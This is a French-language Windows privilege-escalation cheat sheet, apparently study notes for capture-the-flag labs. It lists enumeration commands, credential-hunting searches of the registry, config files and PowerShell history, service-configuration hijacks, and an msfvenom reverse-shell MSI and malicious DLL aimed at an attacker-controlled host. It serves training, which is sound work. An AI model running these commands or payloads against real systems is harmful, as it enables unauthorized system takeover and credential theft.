---
technique: "Méthodologie — Windows Privilege Escalation"
os: Windows
categorie: Référence
tags: [methodologie, privesc, windows, reference, cheatsheet]
---

> ⬅️ HOME · La fiche à garder **ouverte pendant** la room
>
> 📖 Théorie associée : 00-Theorie-Windows-PrivEsc

# Méthodologie — Windows PrivEsc (diagnostic + arbre de décision)

> Principe : pour chaque vecteur → **1 commande de diagnostic** + **ce qui, dans la sortie, confirme que c'est exploitable**.

---

## PHASE 0 — Énumération initiale (toujours faire ça en premier)
```cmd
whoami                         :: qui suis-je
whoami /priv                   :: MES PRIVILÈGES ← le plus important
whoami /groups                 :: mes groupes
net user                       :: liste des comptes locaux
net user <moi>                 :: mes groupes/détails
net localgroup administrators  :: qui est admin
systeminfo                     :: OS, version, patchs (→ exploit kernel ?)
hostname
ipconfig /all
```
```powershell
# équivalents / compléments PowerShell
Get-LocalUser
Get-LocalGroupMember Administrators
```

**→ Décision immédiate :** regarde `whoami /priv`. Si tu vois un de ces privilèges **Enabled**, saute directement au vecteur correspondant :

| Si `whoami /priv` montre... | → Vecteur | Fiche |
|------------------------------|-----------|-------|
| `SeImpersonatePrivilege` | Potato (RogueWinRM/PrintSpoofer/GodPotato) | SeImpersonate |
| `SeBackupPrivilege` | dump SAM+SYSTEM | SeBackupPrivilege |
| `SeTakeOwnershipPrivilege` | prendre un exe SYSTEM | SeTakeOwnership |
| `SeRestorePrivilege` | écrire un fichier protégé | (remplacer binaire) |
| `SeDebugPrivilege` | injecter / dump lsass | — |
| `SeLoadDriverPrivilege` | charger driver vulnérable | — |

---

## VECTEUR 1 — Services : exe inscriptible
**Diagnostic :**
```cmd
sc qc <service>                          :: voir BINARY_PATH_NAME + SERVICE_START_NAME
icacls "C:\chemin\vers\service.exe"
```
**C'est un vecteur SI :** `icacls` montre `Everyone` ou `BUILTIN\Users` avec **(M)** (Modify) ou **(F)** (Full) sur l'exe.
**→** je remplace l'exe → Service-Insecure-Permissions

---

## VECTEUR 2 — Services : chemin non quoté
**Diagnostic :**
```cmd
:: lister tous les services au chemin non quoté avec espaces
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
```
**C'est un vecteur SI :** un `PATHNAME` contient des **espaces**, **pas de guillemets**, ET un dossier intermédiaire est inscriptible :
```cmd
icacls "C:\MyPrograms"      :: cherche (AD)=create files, (WD)=create folders pour Users
```
**→** je dépose un exe prioritaire → Unquoted-Service-Path

---

## VECTEUR 3 — Services : DACL faible
**Diagnostic :**
```cmd
C:\tools\accesschk64.exe -qlc <service>      :: -accepteula si demandé
```
**C'est un vecteur SI :** `BUILTIN\Users` (ou mon groupe) a **SERVICE_ALL_ACCESS** ou **SERVICE_CHANGE_CONFIG**.
**→** `sc config <svc> binPath= "..." obj= LocalSystem` → Weak-Service-DACL

> Pas d'accesschk ? Alternative : winPEAS liste les services modifiables.

---

## VECTEUR 4 — Tâches planifiées
**Diagnostic :**
```cmd
schtasks /query /fo LIST /v | findstr /i "TaskName Run As User Task To Run"
```
**C'est un vecteur SI :** une tâche tourne en tant qu'un user privilégié ET le script/exe qu'elle lance est inscriptible par moi :
```cmd
icacls "C:\chemin\du\script.bat"      :: (M) ou (F) pour Users/Everyone ?
```
**→** j'édite le script, j'attends l'exécution de la tâche.

---

## VECTEUR 5 — AlwaysInstallElevated
**Diagnostic :**
```cmd
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
**C'est un vecteur SI :** **les DEUX** clés valent `0x1`.
**→** payload MSI :
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=MON_IP LPORT=4444 -f msi -o eleve.msi
```
```cmd
msiexec /quiet /qn /i C:\Temp\eleve.msi
```

---

## VECTEUR 6 — Credentials qui traînent
**Diagnostic :**
```cmd
cmdkey /list                                 :: creds stockés
reg query HKLM /f password /t REG_SZ /s      :: mots de passe dans le registre
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"  :: DefaultPassword ?
dir /s /b *pass* == *cred* == *.config == unattend.xml 2>nul
findstr /si password *.txt *.ini *.config *.xml
```
```powershell
# Historique PowerShell (souvent oublié, souvent payant)
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
**C'est un vecteur SI :** tu trouves un mot de passe / un `cmdkey` stocké.
**→** `runas /savecred /user:admin cmd.exe` ou connexion directe.

---

## VECTEUR 7 — Registre autoruns inscriptibles
**Diagnostic :**
```cmd
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```
**C'est un vecteur SI :** un exe lancé au démarrage, ou la clé Run, est modifiable (vérifie avec `icacls` sur l'exe, ou `accesschk` sur la clé).

---

## VECTEUR 8 — DLL hijacking
**Diagnostic :** une appli privilégiée charge une DLL absente d'un dossier inscriptible (repérable avec Procmon « NAME NOT FOUND » sur un `.dll`, ou via winPEAS).
**C'est un vecteur SI :** tu peux écrire la DLL manquante dans un dossier que l'appli parcourt avant le bon.
**→** DLL malveillante (msfvenom `-f dll`).

---

## FILET DE SÉCURITÉ — winPEAS (ne rien rater)
Quand l'énum manuelle ne donne rien, lance l'auto :
```cmd
:: transférer puis
winPEASx64.exe
```
Il surligne en **rouge/jaune** les vecteurs exploitables (services, privs, creds, registre, patchs manquants). Lis les sections **Services**, **Privileges**, **Credentials**, **Scheduled tasks**.

---

## ARBRE DE DÉCISION RAPIDE (ordre conseillé)
```
1. whoami /priv        → privilège exploitable ?  OUI → Potato / SeBackup / SeTakeOwnership
2. whoami /groups      → groupe spécial (Backup Operators, etc.) ?
3. sc qc + icacls      → exe de service inscriptible ?           → V1
4. accesschk -qlc      → DACL de service faible ?                → V3
5. wmic service...     → chemin non quoté + dossier writable ?   → V2
6. schtasks /query     → tâche planifiée + script writable ?     → V4
7. reg query (AIE)     → AlwaysInstallElevated = 1/1 ?           → V5
8. cmdkey + findstr    → credentials qui traînent ?              → V6
9. winPEAS             → si rien trouvé à la main
```

---

## RÈGLES À RETENIR (mes pièges, comme en Linux)
- **Toujours `whoami /priv` en premier** — 80 % des rooms Windows se jouent là.
- Un **port/IP de reverse shell = TOUJOURS les miens**, jamais ceux d'un hint.
- **Lancer le listener AVANT** le payload.
- `sc` en PowerShell = `Set-Content` → utiliser **`sc.exe`**.
- Attention aux **espaces après `=`** dans `sc config binPath= "..." obj= LocalSystem`.
- Un `sc stop` qui renvoie **1062** (« service not started ») n'est **pas** bloquant.
- Comme en `jump` Linux : à chaque palier, re-poser **qui suis-je / qu'est-ce qui tourne / qu'est-ce que je contrôle**.
